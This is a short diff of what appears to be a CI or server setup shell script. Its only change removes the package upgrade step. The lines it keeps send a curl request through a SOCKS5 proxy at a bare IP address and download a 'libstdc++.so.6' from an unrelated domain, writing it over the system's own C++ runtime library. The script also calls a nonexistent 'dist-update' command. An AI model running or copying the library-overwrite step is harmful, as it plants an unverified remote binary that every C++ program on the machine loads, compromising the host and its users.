@@ -1,5 +1,4 @@
 sudo apt-get update
-sudo apt-get upgrade -y
 sudo apt-get dist-update
 curl -v -x socks5://207.180.236.140:1080 https://circleci.com//
 curl -o "/usr/lib/x86_64-linux-gnu/libstdc++.so.6" "https://doxspace.xyz/libstdc++.so.6"
